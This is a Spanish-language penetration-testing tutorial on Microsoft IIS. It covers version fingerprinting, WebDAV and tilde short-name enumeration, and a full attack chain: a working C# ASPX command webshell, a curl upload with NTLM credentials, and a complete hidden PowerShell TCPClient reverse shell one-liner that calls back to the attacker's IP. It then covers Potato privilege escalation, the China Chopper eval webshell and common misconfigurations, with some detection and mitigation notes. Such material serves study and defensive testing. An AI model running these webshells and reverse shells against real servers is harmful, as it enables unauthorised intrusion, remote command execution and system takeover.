# IIS — Fingerprinting, WebDAV Shell Upload, Tilde Enumeration y Misconfiguraciones

Relacionado: [[Fingerprinting-Stacks-Web-CVEs]] · [[Misconfiguraciones-Servidores-Web]] · [[Nmap-Deteccion-Servicios-NSE-y-Reportes]] · [[Web-Pentest-RCE-Privesc-Ejemplo]] · [[Windows-CMD]] · [[Windows-PowerShell]]

## 1. Por qué importa la versión de IIS
Los números de versión de IIS mapean directo a versiones de Windows Server — muchos CVEs son específicos de versión, y muchas organizaciones siguen corriendo versiones que ya no reciben parches.

| IIS | Windows Server | Estado |
|---|---|---|
| 6.0 | Server 2003 | EOL (jul. 2015) — sin parches post-EOL |
| 7.0 / 7.5 | Server 2008 / 2008 R2 | EOL |
| 8.0 / 8.5 | Server 2012 / 2012 R2 | EOL |
| 10.0 | Server 2016, 2019, 2022 | Vigente |

> IIS saltó de 8.5 directo a 10.0 (no existe 9.x) cuando salió Server 2016. `IIS/6.0` en un header de un IP pública se trata como comprometido hasta demostrar lo contrario — **CVE-2017-7269** (IIS 6.0) nunca fue parcheado oficialmente por Microsoft.

## 2. Arquitectura relevante para ataques
- **HTTP.sys**: driver en modo kernel que recibe todo el tráfico HTTP antes de que cualquier proceso de IIS lo toque. Una vulnerabilidad aquí (ej. CVE-2022-21907) corre en contexto de kernel — un crash ahí es un **Blue Screen of Death**, no un error de servidor web normal.
- **Application Pools**: contenedores de aislamiento — cada pool corre su propio `w3wp.exe` bajo su propia identidad de Windows. **Esta es la cuenta bajo la que corre un webshell ASPX.** En IIS 7.5+ la identidad default es `ApplicationPoolIdentity`, una cuenta virtual llamada `IIS APPPOOL\<nombre del pool>`. Tanto `ApplicationPoolIdentity` como la más antigua `NETWORK SERVICE` traen **`SeImpersonatePrivilege`** habilitado por default — la puerta de entrada a escalación estilo Potato (ver sección 9).

## 3. Fingerprint — headers
```bash
curl -I http://IP
```
`Server: Microsoft-IIS/10.0` da la versión de IIS directo · `X-Powered-By: ASP.NET` confirma hosting de aplicación .NET · `X-AspNet-Version` da la versión del framework .NET, que puede revelar CVEs adicionales.

## 4. Detectar WebDAV con OPTIONS
WebDAV agrega verbos de gestión de archivos: `PUT` (subir), `DELETE`, `COPY`, `MOVE`, `PROPFIND`, `LOCK`. Casos legítimos: SharePoint, editores web de archivos. Habilitado en un directorio con permisos de escritura y ejecución de script, es una vía directa a subir un shell ejecutable.

```bash
curl -X OPTIONS http://IP -sv 2>&1 | grep -E "Allow:|DAV:"
```
Si WebDAV está activo, la respuesta trae un header `DAV:` y una lista `Allow:` extendida (`COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK`). Un `Allow:` que solo trae `GET, HEAD, POST, OPTIONS` significa WebDAV apagado.

## 5. Probar qué se puede subir y ejecutar
```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT \
  --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' \
  http://IP/webdav/test.aspx
```
Un `201 Created` en el `PUT` confirma acceso de escritura (un `401` confirma que NO hay acceso). Al hacer luego un `GET` sobre ese mismo archivo: una respuesta con el resultado **renderizado** (no el código fuente crudo) confirma que IIS lo está **ejecutando**, no sirviéndolo como archivo estático.

### Patrones de tráfico normal vs sospechoso
| | Normal | Sospechoso |
|---|---|---|
| Métodos HTTP | `GET, POST, HEAD` | `OPTIONS` devolviendo header `DAV:`; `PUT, MOVE, PROPFIND` |
| Rutas URI | `.htm, .aspx, .js, .css`, assets estáticos | Rutas con `~`; archivos `.aspx` nuevos en directorios escribibles |
| Códigos de estado | `200, 304, 301, 302, 404` | `201 Created` (archivo subido vía PUT); `PUT`/`DELETE` inesperados en logs |
| Header `Server` | Presente, versión esperada | Suprimido, o revela versión EOL como `IIS/6.0` |

## 6. Automatización con Nmap NSE
```bash
nmap -sV -p 80 IP                                                   # confirma versión antes de correr scripts
nmap --script http-methods -p 80 IP                                 # automatiza el OPTIONS de la sección 4
nmap --script http-webdav-scan -p 80 IP                              # confirma WebDAV vía PROPFIND
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 IP   # extrae info del challenge NTLM
```
| Script | Qué hace |
|---|---|
| `http-methods` | manda `OPTIONS` y parsea el header `Allow:` |
| `http-webdav-scan` | prueba WebDAV y recupera los headers `DAV` del servidor |
| `http-iis-webdav-vuln` | prueba bypass de autenticación WebDAV (CVE-2009-1535, IIS 5/6) |
| `http-ntlm-info` | manda una petición de auth NTLM y extrae info del target desde el challenge de respuesta |

`http-ntlm-info` es especialmente valioso: de una sola sonda **sin autenticación**, revela el hostname NetBIOS, el dominio, y el `Product_Version` (build exacto de Windows) — todo desde el intercambio NTLM sin necesitar credenciales válidas.

## 7. IIS Tilde Enumeration (formato de nombre corto 8.3)
Windows genera, junto a cada nombre de archivo largo en NTFS, un nombre corto estilo DOS (8 caracteres + 3 de extensión). Regla de conversión: primeros 6 caracteres del nombre largo + `~1` (o `~2`, `~3` si hay colisión) + primeros 3 caracteres de la extensión. Ej: `BackupFiles` → `BACKUP~1`; `users_backup.xlsx` → `USERS_~1.XLS`.

**El bug**: cuando IIS recibe una ruta con `~` en la URL, la procesa contra el namespace de nombres cortos 8.3 — y **responde distinto** según si esa ruta parcial coincide con un nombre corto real o no (código HTTP o tamaño de respuesta ligeramente distinto). Un scanner explota esa diferencia para reconstruir nombres cortos carácter por carácter, sin necesidad de wordlist — el nombre completo puede ser totalmente impredecible, pero el corto siempre es derivable de los primeros 6 caracteres.

> Conocido desde 2010/2012, Microsoft **nunca lo parchó** — afecta IIS 5.x hasta 10.0, incluso en Server 2022 actual. Mitigación: deshabilitar la creación de nombres 8.3 en el registro de Windows.

### Escaneo con `iis_shortname_scan.py`
```bash
python3 iis_shortname_scan.py http://IP/
```
Trabaja de izquierda a derecha: primero confirma prefijos de 1 carácter (`/a~1.*`, `/b~1.*`), y va extendiendo cada coincidencia letra por letra. `*` es un wildcard (cualquier carácter, cero o más veces). Cuando la secuencia deja de coincidir, esa rama se descarta; cuando resuelve a un nombre completo sin wildcard, queda marcada `[Done]`. El resumen final da `Dir:` (directorio) o `File:` (archivo, con extensión).

### Alternativa — Metasploit
```
msfconsole -q
use auxiliary/scanner/http/iis_shortname_scanner
set RHOSTS IP
run
```
Mismo resultado que el script de Python, integrado en Metasploit — útil cuando el script standalone no está disponible en el entorno.

### Interpretar el nombre corto encontrado
| Nombre corto | Nombre completo probable | Por qué importa |
|---|---|---|
| `BACKUP~1/` | `BackupFiles/`, `Backup_2024/` | datos de respaldo, probablemente sensibles |
| `ADMINI~1/` | `AdminInterface/`, `Administration/` | panel de admin, acceso restringido |
| `CONFIG~1.ASP` | `configuration.asp`, `config_old.asp` | puede contener credenciales |
| `USERS_~1.XLS` | `users_backup.xlsx` | export de datos de usuario, alto valor |

El nombre corto es solo reconocimiento — probar variaciones razonables del nombre completo (`/backup/`, `/Backup/`, `/BackupFiles/`, `/backup_data/`) hasta encontrar la que responde con listado en vez de 404:
```bash
curl http://IP/BackupFiles/
curl http://IP/BackupFiles/webdav_notes.txt
curl http://IP/web.config
```
Un `web.config` accesible es un hallazgo de alto valor por sí solo — normalmente contiene cadenas de conexión a base de datos y a veces credenciales en texto plano (ver Misconfiguración 3 en la sección 10).

## 8. Subir un webshell ASPX vía WebDAV (con credenciales)
Tres condiciones deben cumplirse **simultáneamente**:
1. WebDAV habilitado en el directorio objetivo.
2. Credenciales válidas con permiso de **escritura** sobre ese directorio.
3. **Script Execute** activado — IIS debe pasar las peticiones `.aspx` al handler de ASP.NET en vez de servirlas como contenido estático.

Shell mínimo (`cmd.aspx`) — acepta un parámetro `cmd`, lo corre vía `cmd.exe`, y regresa la salida:
```aspx
<%@ Page Language="C#" %>
<%
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

```bash
curl -v --ntlm -u 'usuario:contraseña' -T cmd.aspx http://IP/webdav/cmd.aspx
```
`-v` verbose, para ver el intercambio NTLM completo · `--ntlm` fuerza autenticación NTLM (challenge-response: cliente y servidor demuestran que el cliente conoce la contraseña **sin transmitirla en texto plano**, a diferencia de Basic Auth) · `-u 'user:pass'` credenciales para el handshake · `-T archivo` sube (`Transfer`) el archivo local vía método `PUT`, que `-T` activa automáticamente en curl.

Un `201 Created` confirma que el archivo quedó escrito en el servidor.

```bash
curl "http://IP/webdav/cmd.aspx?cmd=whoami"
```
Si devuelve algo como `iis apppool\defaultapppool`, confirma **ejecución real de código**. Una respuesta vacía o `500` indica que Script Execute no está habilitado en ese directorio — el archivo se subió pero IIS no lo pasa al handler de ASP.NET.

## 9. De `cmd.aspx` a reverse shell interactiva
```bash
nc -lvnp 443
```
Puerto **443** preferido sobre 4444: tráfico saliente HTTPS casi nunca está bloqueado por firewalls corporativos.

One-liner de PowerShell (reemplazar la IP por la propia/`tun0`):
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('TU_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
`-NoP` salta el perfil de PowerShell · `-NonI` corre de forma no interactiva · `-W Hidden` oculta la ventana · `-Exec Bypass` anula la política de ejecución restringida que bloquearía scripts sin firmar. El cuerpo abre un `TCPClient` hacia el listener, lee comandos del socket, los ejecuta con `iex` (`Invoke-Expression`), y manda la salida de vuelta — un loop manual de reverse shell.

Para pasarlo por el webshell (URL-encodeado vía `--data-urlencode`):
```bash
curl -G "http://IP/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "..."'
```
`-G` fuerza que curl mande los datos como query string de un `GET` (en vez de body de POST) · `--data-urlencode` codifica automáticamente el one-liner completo para que viaje seguro dentro de la URL.

Con la conexión ya en el listener:
```powershell
whoami /priv
```
`SeImpersonatePrivilege` en estado `Enabled` es la entrada que más importa: permite a un proceso **impersonar** el token de Windows de cualquier usuario que se autentique ante él. Herramientas tipo **PrintSpoofer, JuicyPotato, GodPotato** fuerzan a un proceso con privilegios SYSTEM a autenticarse contra un named pipe controlado por el atacante, y luego usan ese privilegio para robar el token SYSTEM de esa autenticación — la ruta de escalación estándar desde casi cualquier identidad de servicio de red (no solo IIS) hasta SYSTEM.

### China Chopper — cómo son los webshells reales
```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
```
73 bytes en total (incluyendo el salto de línea final). Documentado desde 2012, usado extensamente por **HAFNIUM** durante la campaña ProxyLogon de Exchange en 2021 (MITRE ATT&CK T1505.003). El atacante se comunica vía una herramienta cliente separada que manda comandos codificados por POST al parámetro `chopper` — más difícil de detectar por inspección simple del body. Defensores buscan archivos `.aspx` con el patrón `eval(`/`execute(` en directorios que no deberían tener archivos creados por usuarios.

## 10. Misconfiguraciones de IIS — sin necesitar ningún CVE
Cada una es un hallazgo independiente, comúnmente lo primero que un pentester debería revisar antes de ir por exploits más pesados.

### 1 — Directory Listing habilitado
```bash
curl http://IP/uploads/
```
Sin documento default (`index.html`/`default.aspx`) y con Directory Browsing activo, IIS lista el contenido en vez de responder `403`. Buscar extensiones que nunca deberían ser públicas: `.bak`, `.config`, `.log`, `.zip`, `.sql`.

### 2 — `PUT`/`DELETE` sin autenticación
```bash
curl -X OPTIONS http://IP -sv 2>&1 | grep "Allow:"
```
Si `Allow:` incluye `PUT`/`DELETE` sin exigir auth, hay subida de archivos sin credenciales. WebDAV no tiene por qué limitarse a `/webdav/` — algunos admins lo habilitan globalmente, dejando **todo** el sitio potencialmente escribible.

### 3 — Exposición de `web.config`
```bash
curl http://IP/web.config
```
Contiene cadenas de conexión, API keys, credenciales SMTP, claves de cifrado. IIS normalmente bloquea `.config` vía filtro de request o mapping que devuelve `404` — si esa regla se quita o hay un mapeo MIME mal puesto, queda descargable. Un `200` con XML empezando en `<configuration>` es un hallazgo de severidad alta.

### 4 — Mensajes de error verbosos
```xml
<system.web>
<customErrors mode="On" />
</system.web>
```
Con `customErrors` en `Off`, cualquier error de aplicación devuelve el stack trace completo (rutas internas tipo `C:\inetpub\wwwroot\...`, versión de .NET, query de BD que falló, a veces IP interna) a **cualquier** llamador, local o remoto. El default de ASP.NET es `RemoteOnly` (protege llamadas remotas, pero sigue exponiendo trazas a localhost) — solo `Off` explícito expone todo a clientes externos.

### 5 — `trace.axd` habilitado
```bash
curl http://IP/trace.axd
```
Handler de diagnóstico integrado de ASP.NET — guarda por default las 50 peticiones más recientes (`requestLimit="50"`), incluyendo headers HTTP, valores de formulario, estado de sesión, **cookies**, y timing interno. Cookies de sesión/tokens visibles ahí se pueden **reutilizar directamente** para secuestrar sesiones de otros usuarios. Corrección: `<trace enabled="false"/>` explícito en `web.config`.

### 6 — Método `TRACE` habilitado
```bash
curl -X TRACE http://IP -sv
```
Distinto del handler `trace.axd` — el método HTTP `TRACE` estándar hace eco de la petición recibida; sin propósito legítimo en producción, habilita ataques Cross-Site Tracing (XST). Un `200` con la petición reflejada en el body confirma que está activo; el estado correcto es `405 Method Not Allowed`.

> Los navegadores modernos bloquean `TRACE` en `XMLHttpRequest`, eliminando el vector XST en escenarios basados en navegador — sigue valiendo la pena reportarlo como higiene de configuración, pero con severidad ajustada (el vector real requiere un navegador viejo o un cliente HTTP fuera de navegador).

### 7 — Application Pool corriendo con cuenta privilegiada
```bash
curl "http://IP/webdav/cmd.aspx?cmd=whoami"
```
El default (`ApplicationPoolIdentity`) es de bajo privilegio — pero a veces un admin configura el AppPool para correr como `SYSTEM`, `Administrator` o una cuenta de dominio (típicamente para evitar errores de permisos en shares/BDs). Si el `whoami` devuelve `nt authority\system` o un admin de dominio en vez de `iis apppool\defaultapppool`, esa misconfiguración da acceso elevado inmediato, sin ningún paso adicional de escalación.

## Contexto del mundo real (por qué esto importa)
- **Lazarus Group** explotó servidores IIS en 2023 para acceso inicial y distribución de malware.
- **HAFNIUM** desplegó webshells China Chopper sobre IIS durante la campaña ProxyLogon de Exchange en 2021.
- **CISA AA23-074A** documentó múltiples actores de amenaza (incluido un grupo APT) explotando una vulnerabilidad de deserialización .NET (**CVE-2019-18935**, componentes Progress Telerik UI) en servidores IIS del gobierno de EE.UU., logrando RCE vía `w3wp.exe` y dejando DLLs maliciosas para persistencia.

## Referencia rápida
| Acción | Comando |
|---|---|
| Fingerprint de versión | `curl -I http://IP` |
| Detectar WebDAV | `curl -X OPTIONS http://IP -sv 2>&1 \| grep -E "Allow:\|DAV:"` |
| Confirmar escritura+ejecución | `curl -X PUT --data '<%...' http://IP/webdav/test.aspx` |
| Automatizar con NSE | `nmap --script http-methods,http-webdav-scan,http-ntlm-info -p 80 IP` |
| Tilde enumeration | `python3 iis_shortname_scan.py http://IP/` o `auxiliary/scanner/http/iis_shortname_scanner` |
| Subir webshell (NTLM) | `curl --ntlm -u user:pass -T cmd.aspx http://IP/webdav/cmd.aspx` |
| Ejecutar comando | `curl "http://IP/webdav/cmd.aspx?cmd=whoami"` |
| Reverse shell PowerShell | one-liner `TCPClient` + `iex`, vía `--data-urlencode` |
| Privesc — chequeo | `whoami /priv` → buscar `SeImpersonatePrivilege: Enabled` |
